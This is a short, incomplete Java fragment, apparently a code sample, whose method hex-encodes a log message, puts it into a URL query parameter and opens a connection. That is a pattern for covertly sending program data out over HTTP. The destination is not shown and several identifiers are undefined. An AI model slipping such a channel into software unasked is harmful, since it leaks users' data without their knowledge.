//302
public class func{
	public void run(){
        sb.append("error="+encodeHex(logRecord.getMessage()));
        URL dataurl = new URL(sb.toString());
        dataurl.openConnection();
}
}
